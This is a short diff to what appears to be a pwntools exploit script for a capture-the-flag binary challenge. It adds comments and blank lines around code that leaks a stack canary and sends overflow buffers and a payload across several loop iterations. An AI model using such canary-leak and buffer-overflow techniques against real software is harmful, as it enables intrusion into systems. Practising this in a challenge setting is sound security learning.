@@ -19,6 +19,8 @@ canary_bytes = output[24:32]
 canary = u64(canary_bytes)
 canary = canary & 0xffffffffffffff00  
 print(hex(canary))
+
+
 # Second day 
 p.recvuntil(b"hours remaining\n")
 p.send(b'B' * 24 + b'C' * 16) # 
@@ -45,11 +47,14 @@ payload = flat(
 p.recvuntil(b"hours remaining\n")
 p.send(payload)
 
+# first day, do nothing, no canary to leak as it is the same as the first loop 
 p.recvuntil(b"hours remaining\n")
 p.send(b'A' * 25 )
 p.recvuntil(b"\n")
 output = p.recvuntil(b"Dawn")
 
+
+# first day of second loop 
 p.recvuntil(b"hours remaining\n")
 p.send(b'C' * 7 + b'D' * 8) # 
 p.recvuntil(b"\n")
